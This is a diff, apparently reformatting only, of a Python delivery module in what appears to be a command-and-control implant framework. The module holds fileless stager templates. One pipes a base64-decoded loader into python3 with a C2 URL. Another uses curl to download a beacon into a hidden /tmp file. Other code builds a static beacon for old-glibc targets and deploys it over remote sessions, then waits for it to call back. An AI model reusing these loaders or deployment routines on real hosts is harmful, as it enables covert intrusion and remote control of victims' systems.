@@ -127,8 +127,7 @@ _FILELESS_STAGE_TEMPLATES: list[str] = [
     "BSB_STAGE_INSECURE_TLS=1 python3 -",
     # 2. Raw /s/ channel: tokenless memfd loader over the implant-stage
     #    files (binary + runtime config staged by stage_client).
-    "echo {stager_b64} | base64 -d | "
-    "BSB_STAGE_URL='https://{lhost}:{c2_port}' python3 -",
+    "echo {stager_b64} | base64 -d | BSB_STAGE_URL='https://{lhost}:{c2_port}' python3 -",
     # 3. Last resort: disk-based bootstrap (visible, but works without
     #    python3-friendliness concerns beyond curl).
     "curl -sk https://{lhost}:{c2_port}/s/blacksandbeacon -o /tmp/.svc ; "
@@ -589,7 +588,7 @@ def _build_portable_beacon(addon: ClientAddon, config: BofDeliveryConfig) -> boo
     result = safe_run_shell(
         f"docker run --rm -v {checkout_quoted}:/src -w /src alpine:latest sh -c "
         f"'apk add --no-cache build-base curl-dev openssl-dev >/dev/null 2>&1 && "
-        f"make beacon LDFLAGS=\"-static -lcurl -lssl -lcrypto\" >/dev/null 2>&1 && "
+        f'make beacon LDFLAGS="-static -lcurl -lssl -lcrypto" >/dev/null 2>&1 && '
         f"strip build/beacon'",
         allow=True,
         reason=f"build static {addon.name} beacon for old-glibc targets",
@@ -863,18 +862,14 @@ def _apply_compat_patch(checkout: Path) -> bool:
     if "        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);" in source:
         source = source.replace(
             "        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);",
-            "#ifdef CURLOPT_PINNEDPUBLICKEY\n"
-            "        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);\n"
-            "#endif",
+            "#ifdef CURLOPT_PINNEDPUBLICKEY\n        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);\n#endif",
             1,
         )
         touched = True
     if '    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");' in source:
         source = source.replace(
             '    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");',
-            "#ifdef CURLOPT_ACCEPT_ENCODING\n"
-            '    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");\n'
-            "#endif",
+            '#ifdef CURLOPT_ACCEPT_ENCODING\n    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");\n#endif',
             1,
         )
         touched = True
@@ -882,10 +877,7 @@ def _apply_compat_patch(checkout: Path) -> bool:
         source = _COMPAT_ASM_RE.sub(lambda _match: _COMPAT_ASM_64, source, count=1)
         touched = True
     if touched:
-        source = (
-            "/* " + _COMPAT_MARKER + ": old-toolchain guards applied by bof_delivery. */\n"
-            + source
-        )
+        source = "/* " + _COMPAT_MARKER + ": old-toolchain guards applied by bof_delivery. */\n" + source
         source_path.write_text(source, encoding="utf-8")
         log.info("old-toolchain compat patch applied (%s)", source_path)
     return touched
@@ -1510,9 +1502,7 @@ def deploy_client(
         session.run(remote_line, timeout=60)
         style = "disk" if "curl" in template else ("upstream-stage" if "stage_payload_b64" in template else "raw-s")
         attempts.append({"attempt": index, "style": style, "ran": True, "waited": probe})
-        record = wait_for_beacon(
-            client_id, since=since, timeout=probe, config=cfg, payload=data, command=probe_command
-        )
+        record = wait_for_beacon(client_id, since=since, timeout=probe, config=cfg, payload=data, command=probe_command)
         if record:
             break
         remaining -= probe
